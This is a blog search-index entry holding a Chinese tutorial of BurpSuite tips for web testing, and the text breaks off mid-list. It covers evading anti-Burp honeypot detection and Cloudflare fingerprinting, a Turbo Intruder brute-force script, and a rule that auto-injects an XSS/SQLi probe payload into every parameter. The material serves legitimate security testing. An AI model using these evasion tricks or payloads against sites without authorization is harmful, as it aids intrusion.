<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BurpSuite Trick ALL In ONE (第一版)</title>
    <url>/posts/1a1a47be.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：你真的会用 BurpSuite 吗？</p>
</blockquote>
<blockquote>
<p>转载自：<a href="https://forum.butian.net/share/686">https://forum.butian.net/share/686</a></p>
</blockquote>
<h1 id="BurpSuite-Trick-ALL-In-ONE-第一版"><a href="#BurpSuite-Trick-ALL-In-ONE-第一版" class="headerlink" title="BurpSuite Trick ALL In ONE (第一版)"></a>BurpSuite Trick ALL In ONE (第一版)</h1><h2 id="0x01-Basic"><a href="#0x01-Basic" class="headerlink" title="0x01 Basic"></a>0x01 Basic</h2><h3 id="1x1-Anti-Burp-by-Web-Interface"><a href="#1x1-Anti-Burp-by-Web-Interface" class="headerlink" title="1x1 Anti Burp by Web Interface"></a>1x1 Anti Burp by Web Interface</h3><ol>
<li><p>配置SwitchyOmega代理的时候增加设置如下列表的不走代理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">burp</span><br><span class="line">burpsuite</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/BurpSuite%E4%BD%BF%E7%94%A8Trick/attach-d39c94b8338b6646164d7f7cae38440ecb5e2c63.png" alt="-w624"></p>
</li>
<li><p>在burpsuite的proxy的opions中禁用掉 web interface <a href="http://burpsuite/">http://burpsuite</a></p>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/BurpSuite%E4%BD%BF%E7%94%A8Trick/attach-3a0b1c5dfe985118c648a5da5b1098ec7ef57145.png" alt="截屏2021-05-25 上午10.37.08"></p>
<p>主要原因是防止被检测到使用burpsuite在抓包，最重要的是防止被检测到使用burp抓包之后返回蜜罐的响应信息给你。<br>参考: <a href="https://mp.weixin.qq.com/s/V0WdN9CMrTqo6qInuwyR6g">《精确判断网站访问者是否是黑客的方法》</a></p>
<ol>
<li>最好把burp的favicon.ico也删除</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">zip -d burpsuite_pro.jar <span class="string">&quot;resources/Media/favicon.ico&quot;</span></span><br></pre></td></tr></table></figure>

<p>参考: <a href="https://mp.weixin.qq.com/s/Dasaal6njCUNU9Dfk-4exA">《使用javascript确认对方是否开burpsuite，蜜罐必备策略》</a></p>
<h3 id="1x2-Anti-Burp-by-JA3-指纹"><a href="#1x2-Anti-Burp-by-JA3-指纹" class="headerlink" title="1x2 Anti Burp by JA3 指纹"></a>1x2 Anti Burp by JA3 指纹</h3><p>cloudflare上的https站点使用burp和python均无法发包，应对的方式就是在burp的上游再加一个代理。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/BurpSuite%E4%BD%BF%E7%94%A8Trick/attach-4a69b69ae5210f0bfa8ef4d6a71c9945659426f6.jpg" alt="-w930"></p>
<p>cloudflare的anti burp的项目: <a href="https://github.com/cloudflare/mitmengine">https://github.com/cloudflare/mitmengine</a></p>
<p>JA3 指纹原理: <a href="https://xz.aliyun.com/t/3889">https://xz.aliyun.com/t/3889</a></p>
<h2 id="0x02-Trick"><a href="#0x02-Trick" class="headerlink" title="0x02 Trick"></a>0x02 Trick</h2><h3 id="2x1-Turbo-Intruder"><a href="#2x1-Turbo-Intruder" class="headerlink" title="2x1 Turbo Intruder"></a>2x1 Turbo Intruder</h3><p>1&#x2F;N 使用方法：</p>
<ol>
<li>首先你需要安装这个插件</li>
<li>选中一个请求，点击右键选择Extensions-Send to turbo intruder</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/BurpSuite%E4%BD%BF%E7%94%A8Trick/attach-0df2971c23fdf3d91681584958baf044a40a9518.png" alt="-w1416"></p>
<p>2&#x2F;N 一旦你向该插件发送请求，一个python编辑器就会打开，窗口会显示几个现有的python脚本，供你参考和使用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc014db62a18602cad4e00ddb256720726202a03.png" alt="-w1196"></p>
<p>3&#x2F;N 增加并发量或增加管道，然后点击攻击。示例代码见(或者下面)：<a href="https://gist.github.com/r0hi7/47e3d47efaa1ee3df63a6e936dade787">BurpTurboIntruderBasicFileWriteMultiParam.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">################### This section will mostly remain as it is ###################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                           concurrentConnections=<span class="number">5</span>,</span><br><span class="line">                           requestsPerConnection=<span class="number">100</span>,</span><br><span class="line">                           pipeline=<span class="literal">False</span></span><br><span class="line">                           )</span><br><span class="line"><span class="comment">################### ---------------------------------------- ###################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># This attack will be similar to ClusterBomb technique</span></span><br><span class="line">    <span class="comment"># As they are nested loops</span></span><br><span class="line">    <span class="comment"># You can do almost anything here, with the power of python, </span></span><br><span class="line">    <span class="comment"># this will be applied to request params where you have set %s %s in the Request section in the top</span></span><br><span class="line">    <span class="keyword">for</span> firstParam <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/share/dict/words&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> secondParam <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/share/dict/web2&#x27;</span>):</span><br><span class="line">            engine.queue(target.req, </span><br><span class="line">                        [</span><br><span class="line">                            firstParam.rstrip(),</span><br><span class="line">                            secondParam.rstrip()</span><br><span class="line">                        ])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do anything with response, let write it to a file.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    <span class="comment"># currently available attributes are req.status, req.wordcount, req.length and req.response</span></span><br><span class="line">    <span class="comment"># add response to the table</span></span><br><span class="line">    table.add(req)</span><br><span class="line">    data = req.response.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="comment"># Extract header and body</span></span><br><span class="line">    header, _, body = data.partition(<span class="string">&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># Save body to file /tmp/turbo.dat</span></span><br><span class="line">    output_file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/turbo.dat&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">    output_file.write(body + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    output_file.close()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cf08e0fb9a0aef2b777ed21a199a20239969482c.png" alt="-w1200"></p>
<p>4&#x2F;N 使用这个插件，你几乎可以在Burp里面用Python做任何事情<br>例如：</p>
<ul>
<li>处理自定义登录</li>
<li>定制化的一些测试</li>
<li>过滤你想要的请求</li>
<li>添加速率限制、管道等</li>
</ul>
<h3 id="2x2-Match-匹配-and-Replace-替换-功能的有效使用"><a href="#2x2-Match-匹配-and-Replace-替换-功能的有效使用" class="headerlink" title="2x2 Match(匹配) and Replace(替换) 功能的有效使用"></a>2x2 Match(匹配) and Replace(替换) 功能的有效使用</h3><p>要点:<br>(1) False2True trick<br>(2) 在所有的参数处注入通用性payload</p>
<p>1&#x2F;N False2True trick，当用户访问一个资源是未经授权的。通过在burp响应体匹配和替换中将服务器响应体从F更改为T，有很大的机会可以使隐藏的客户端控件取消隐藏属性。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b6c78354e7c1563241c67609706c8b37e086ce4e.png" alt="-w1080"></p>
<ol>
<li>添加匹配和替换(Match and replace)。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b54e31c4fb4cef245964869004da4eb73964527c.png" alt="-w1138"></li>
<li>添加所示的替换。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-032521069cb1a00521de54f244096eaa15e0869a.png" alt="-w1131"></li>
</ol>
<p>这是一个将false返回体更改为true的示例技巧。并且这是一个非常常见的用例。</p>
<p>2&#x2F;N 今天的主要技巧。 在表格中自动的注入payload，而不是手动打出整个payload。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4b8f3814e507b316927d95fc5653b9921a1e561b.png" alt="-w1133"></p>
<p>3&#x2F;N 上述匹配和替换规则将把请求主体中的所有KKK替换为SQLi和XSS这种通用型payload。<br>此处的示例载荷</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script src=&quot;somesrc&quot;&gt;&lt;/script&gt;&lt;h1&gt;test</span></span><br></pre></td></tr></table></figure>

<p>这样的话只要把 <code>KKK</code> 放在参数输入处，发送之后就会自动将对应的位置替换为示例中的有效载荷，这样就可以对XSS和SQLi漏洞进行发现。</p>
<p>PS: 其实这个功能也可以用于Hosts碰撞得到host对应的内网域名名之后，设置替换对应的内网域名。相关文章–<a href="https://xz.aliyun.com/t/9590">利用HOSTS碰撞突破边界</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2b22202234ea8b8c0ac68a073a78a6e45b17386c.png" alt="-w928"></p>
<h3 id="2x3-Find-References-Burp中最被低估和未被充分利用的功能"><a href="#2x3-Find-References-Burp中最被低估和未被充分利用的功能" class="headerlink" title="2x3 Find References: Burp中最被低估和未被充分利用的功能"></a>2x3 Find References: Burp中最被低估和未被充分利用的功能</h3><p>PS: 只有Pro版本的可以在整个Burp中去寻找URIs的references(引用)，这个功能的重点是发现客户端脚本对后端的请求，从而发现更多的测试点。</p>
<p>1&#x2F;N 从任何地方挑选请求，右击-&gt; Engagement Tools -&gt; Find References</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3527394571766559b5b4b9ff28481917fe019ca8.png" alt="-w1135"></p>
<p>2&#x2F;N 一个新的窗口将被打开，它将显示references和这些references的位置。位置可以是repeater, scanner等。reference可以是在请求、响应、头文件中。将会像图片中所示的那样被高亮显示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-40994093bbfd6e0c9c5e2919e3940079e36c843c.png" alt="-w1136"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-82215c1b8d04606187925872809febf6a60a9bc6.png" alt="-w1136"></p>
<p>3&#x2F;N 可以用来发现浏览器的脚本发送的请求，并学习它来制作你对该端点的有效载荷请求。</p>
<p>参考: <a href="https://portswigger.net/burp/documentation/desktop/functions/search#Find-references">https://portswigger.net/burp/documentation/desktop/functions/search#Find-references</a></p>
<h3 id="2x4-你可以在req模块中修改被压缩的数据"><a href="#2x4-你可以在req模块中修改被压缩的数据" class="headerlink" title="2x4 你可以在req模块中修改被压缩的数据"></a>2x4 你可以在req模块中修改被压缩的数据</h3><p>不要忽视BurpSuite中那些看起来的脏数据。可以保持这一设置，并在Burp中玩弄压缩数据</p>
<p>1&#x2F;N 在Burp Proxy中，解压设置默认是禁用的，像这样启用它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-721524aee42b9505557b47f3ad28bb15e4d5ad1c.png" alt="-w1062"></p>
<p>2&#x2F;N Before &amp; After.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3c4426c97b789b25547d17c81bdf4c69d578546b.png" alt="-w1137"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b32749d7cd622420674b10199fba74a082531f68.png" alt="-w1137"></p>
<p>参考: <a href="https://portswigger.net/blog/burp-suite-tips-from-power-user-and-hackfluencer-stok">https://portswigger.net/blog/burp-suite-tips-from-power-user-and-hackfluencer-stok</a></p>
<h3 id="2x5-一次性检测所有攻击载荷的攻击效果"><a href="#2x5-一次性检测所有攻击载荷的攻击效果" class="headerlink" title="2x5 一次性检测所有攻击载荷的攻击效果"></a>2x5 一次性检测所有攻击载荷的攻击效果</h3><p>一次性检查intruder, repeater, sequencer等模块中数据包的响应信息，而不是每次都向浏览器发送反应。</p>
<p>一个一个检查intruder模块中的每一个测试结果是非常无聊的(特别是对XSS漏洞)，所以你可以按照如下过程进行操作:</p>
<ol>
<li>在启动intruder之前，转到BurpSuite的project options中 -&gt; logging -&gt; tick intruder response -&gt; 将它保存为一个html文件</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d1f91942d8127d88764d2edca35beb7696d58152.jpg" alt="-w926"></p>
<ol>
<li>然后双击这个html文件，所有的XSS payload就会一起被触发了</li>
</ol>
<h3 id="2x6-禁止Firefox发送与其相关的请求"><a href="#2x6-禁止Firefox发送与其相关的请求" class="headerlink" title="2x6 禁止Firefox发送与其相关的请求"></a>2x6 禁止Firefox发送与其相关的请求</h3><p>0&#x2F;N 首先，为什么使用BurpSuite和Firefox的组合？ 现在的BurpSuite已经内置了Chromium浏览器，为什么还要使用Firefox？</p>
<p>这是因为:</p>
<ul>
<li>Burp内置的Chromium在每次不同的运行中都不能保持设置。</li>
<li>每次都要重新安装插件</li>
<li>不能禁用本地CORS检查</li>
<li>不灵活等。</li>
</ul>
<p>1&#x2F;N 我个人使用火狐浏览器，如果你和我一样使用过它，你一定看到过很多 <code>http://detectportal.firefox.com</code> 的请求。<br>它们很吵，你可以右键点击，然后标记 “不要拦截”，但这也不是一个持久的方法。<br>在CE中，你没有session。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a2c20d227513c7efcaa54219ce6981ee93dadbbf.png" alt="-w1138"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e6670e3b0345b4103bf6d2cb4ffa73174f2b29c.png" alt="-w1060"></p>
<p>2&#x2F;N 最好的办法是在Firefox上禁用这个功能，一劳永逸。<br>相信我，这很容易，这将是你的伟大投资。<br>进入about:config，完全禁用这个功能。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2cd2927f8b90a57d0e13e49ad0663d58cadca98b.png" alt="-w1137"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-062730c20f1e9c6475740e793e9e09c0aa7f17c0.png" alt="-w1137"></p>
<p>这个方法只是其中之一，还有两种解决方案</p>
<ol>
<li>利用 <TLS Pass Through> 功能<br>BurpSuite -&gt; Proxy -&gt; Options -&gt; TLS Pass Through.</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">.*\.gstatic\.com</span><br><span class="line">.*\.googleapis\.com</span><br><span class="line">.*\.pki\.goog</span><br><span class="line">^.*?apple\..*$</span><br><span class="line">^.*?icloud\..*$</span><br><span class="line">^.*?mzstatic\..*$</span><br><span class="line">^.*mozilla\.(com|net|org)$</span><br><span class="line">^.*\.google\.com$</span><br><span class="line">^.*\.gvt1\.com$</span><br><span class="line">^.*\.ghostery\.(com|net)$</span><br><span class="line">^.*\.aka\.ms$</span><br><span class="line">^.*\.msecnd\.net$</span><br><span class="line">^.*\.skype\.com$</span><br><span class="line">^.*\.microsoft\.com$</span><br><span class="line">^.*\.visualstudio\.com$</span><br><span class="line">^.*\.msn\.com$</span><br><span class="line">^.*\.azureedge\.net$</span><br><span class="line">^sb\.scorecardresearch\.com$</span><br><span class="line">^.*\.msedge\.net$</span><br><span class="line">^.*\.bing\.com$</span><br><span class="line">^.*\.windowsupdate\.com$</span><br><span class="line">.*\.windows\.com</span><br><span class="line">.*\.live\.com</span><br><span class="line">.*\.digicert\.com</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dce4ff6b47a8431de984006e54d5f789a34ef513.jpg" alt="-w986"></p>
<p>如果不想一条一条加，可以直接使用这个师傅的配置文件 <a href="https://github.com/parsiya/Parsia-Clone/blob/main/configs/burp-default-config.json">@parsiya</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5d563352f9a3a53726c44faada8f5f3e6542b80e.png" alt="img"></p>
<p>PS: 也有师傅提出如果不需要拦截所有网页流量的话，可以用scope，scope的方法可以参考文章 <a href="https://parsiya.net/blog/2020-05-01-towards-a-quieter-burp-history/">《Towards a Quieter Burp History》</a></p>
<ol>
<li>替换掉firefox的user.js文件，从源头上根治</li>
</ol>
<p>将里面的 <a href="https://gist.github.com/AetherEternity/5a6bb6e493a3d34988fc7342013f2ea6">user.js</a> 放到对应的profie下，firefox就不会发出一堆烦人的请求了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Windows: C:\Users\&lt;username&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\xxxxxxxx.<span class="keyword">default</span></span><br><span class="line"></span><br><span class="line">Mac OS X: Users/&lt;username&gt;/Library/Application Support/Firefox/Profiles/xxxxxxxx.<span class="keyword">default</span></span><br><span class="line"></span><br><span class="line">Linux: /home/&lt;username&gt;/.mozilla/firefox/xxxxxxxx.<span class="keyword">default</span></span><br></pre></td></tr></table></figure>

<h3 id="2x7-宏-Macro-录制的会话"><a href="#2x7-宏-Macro-录制的会话" class="headerlink" title="2x7 宏(Macro):录制的会话"></a>2x7 宏(Macro):录制的会话</h3><h4 id="Part-1-What-How-amp-Why"><a href="#Part-1-What-How-amp-Why" class="headerlink" title="Part 1: What, How &amp; Why?"></a>Part 1: What, How &amp; Why?</h4><p>1&#x2F;N Burp套件中的宏(Macros)是用来记录一组请求的。</p>
<p>你首先通过代理传递请求，然后选择要添加到宏中的请求集来创建这些记录的请求。</p>
<p>要创建一个宏(Macro)。Project Options -&gt; Sessions -&gt; Macro</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6ce619798e5fee06fdc51ad4f64be9c58ab218ca.png" alt="-w978"></p>
<p>2&#x2F;N 点击添加，代理标签将打开。</p>
<p>发送你想记录的请求。<br>点击确定。<br>宏将被记录下来，给它起个好听的名字。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-569e806fc83c37031ab288f028affcff0e1bda8a.png" alt="-w971"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27cbe51a7a280bb2c42a8474630a8c4672b2deba.png" alt="-w1136"></p>
<p>3&#x2F;N 在会话中使用宏。</p>
<p>对于现在所有范围内的URL，在会话下的这个宏将在每个请求之前运行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e6db8da91cbeb155bbaf18c9481cb6f3eb8926e0.png" alt="-w979"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8c962f46e71121bae6569a1b982d32b1d6cdeeb8.png" alt="-w1065"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-219bb23e4cbdb092205f3123dc7397de48ca068f.png" alt="-w988"></p>
<p>N&#x2F;N 使用案例</p>
<ul>
<li>拥有自定义登录的网站(常见的例子就是带token的情况)。</li>
<li>有助于编写扩展插件。</li>
<li>IDOR测试。</li>
</ul>
<p>这里结合一个测试案例来对其功能给一个直观的认识，靶场地址: <a href="https://vuln-demo.com/burp_macro/macro.php">https://vuln-demo.com/burp_macro/macro.php</a></p>
<p>这是典型的使用上一个请求响应中的token作为下一个请求的参数，你发送的请求才能够被后端成功接收的案例。</p>
<p>首先找有token的那个请求记录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1c84a90d92a7ad7c7e98825cf61c612b0e5ff355.jpg" alt="img"></p>
<p>点击 configure item -&gt; add -&gt; 双击对应的字符串，burp会自动创建对应的规则<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-039839d58cb5ed440cf05fe510e87baef8073ef3.jpg" alt="img"></p>
<p>之后设置使我们创建的宏生效(起作用+作用范围)就好了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f1a7a1b3deaec4e638184200e62d46957816ebb9.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-595f2f3b006870108c1b1aed9bfaa37d6288e0e8.jpg" alt="img"></p>
<p>随后在发包的时候只要看到我们的token是发包前更新的就可以验证宏设置成功了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac7727666e1bd644bac5ce2b8f09658355f8117e.png" alt="img"></p>
<p>但是这种的局限性就是他只能替换 <code>token=</code> 这种形式的，对于json或者其他则无能无力，此时就可以使用插件 <a href="https://portswigger.net/bappstore/a0c0cd68ab7c4928b3bf0a9ad48ec8c7">burp-cph</a>，关于这个插件的使用可以参考: <a href="https://www.anquanke.com/post/id/231145">《当面对动态参数爆破时，我们该如何处理?》</a>。但是这个插件还是比较复杂的，更简单一点的插件是 <a href="https://github.com/NetSPI/BurpExtractor">Burp Extractor</a>，对应的文章介绍是 <a href="https://xz.aliyun.com/t/2547">《BurpSuite Extender之巧用Marco和Extractor绕过Token限制》</a></p>
<h4 id="Part-2-How-to-use-to-automate-testing"><a href="#Part-2-How-to-use-to-automate-testing" class="headerlink" title="Part 2: How to use to automate testing?"></a>Part 2: How to use to automate testing?</h4><p>通过宏进行自动化，在为API和受保护的资源创建会话时使用宏。</p>
<p>一旦创建，将其作为会话(session)添加，并设置范围(scope)。在演示中，我将所有的URL添加为范围(scope)。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-898e50609b0ec52e1363445834fe52466630bf59.png" alt="-w1067"></p>
<p>现在，工具范围中提到的所有请求将被宏处理。</p>
<p>可以使用跟踪器(Tracer)来调试宏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7707c2e4b37b3ab0c7a23f8bb487b906671e5a8c.png" alt="-w984"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e2d935c716db3bd6ecd68e10a44a56c913aab08.png" alt="-w1128"></p>
<p>可以使用 portswigger 的lab来对 (Macros) 做练习<br>link: <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money">https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money</a></p>
<h3 id="2x8-在BurpSuite中repeater模块的响应中快速追踪你修改的参数"><a href="#2x8-在BurpSuite中repeater模块的响应中快速追踪你修改的参数" class="headerlink" title="2x8 在BurpSuite中repeater模块的响应中快速追踪你修改的参数"></a>2x8 在BurpSuite中repeater模块的响应中快速追踪你修改的参数</h3><p>当你在中继器选项卡中修改一个参数，它的值会反映在响应中，当你必须滚动查看变化的内容时，你可以启用这个切换键……真正的省时省力!</p>
<p>操作如下图片所示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c79438394fa329bfe07a1b21fb87a977a1c1260e.png" alt="-w1137"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0aae7a38127e28a6e26d6cf495673b07c565ff1c.png" alt="-w1139"></p>
<h3 id="2x9-你在使用BurpSuite时也面临着缓存响应的问题吗？"><a href="#2x9-你在使用BurpSuite时也面临着缓存响应的问题吗？" class="headerlink" title="2x9 你在使用BurpSuite时也面临着缓存响应的问题吗？"></a>2x9 你在使用BurpSuite时也面临着缓存响应的问题吗？</h3><p>如果受到了缓存的影响，那么关闭它就好了</p>
<p>在这个模块中开启以下两个规则 Proxy -&gt; Options -&gt; Match and Replace.</p>
<ul>
<li>If-Modified-Since</li>
<li>If-None-Match</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-93c8263a6fe06b844b9b19f6e4428263614a00b8.png" alt="-w1071"></p>
<p>有时我在Burp中看到304的响应，我不得不在Burp历史中挖掘，以检查第一次出现的响应并进行分析。移除这些头文件后，你可能不会再看到这样的响应。</p>
<h3 id="2x10-在使用BurpSuite-pro进行企业测试的时候，我们不应该捕获和存储企业的证书"><a href="#2x10-在使用BurpSuite-pro进行企业测试的时候，我们不应该捕获和存储企业的证书" class="headerlink" title="2x10 在使用BurpSuite pro进行企业测试的时候，我们不应该捕获和存储企业的证书"></a>2x10 在使用BurpSuite pro进行企业测试的时候，我们不应该捕获和存储企业的证书</h3><p>使用的步骤以及为什么这点是重要的:</p>
<p>步骤:</p>
<ol>
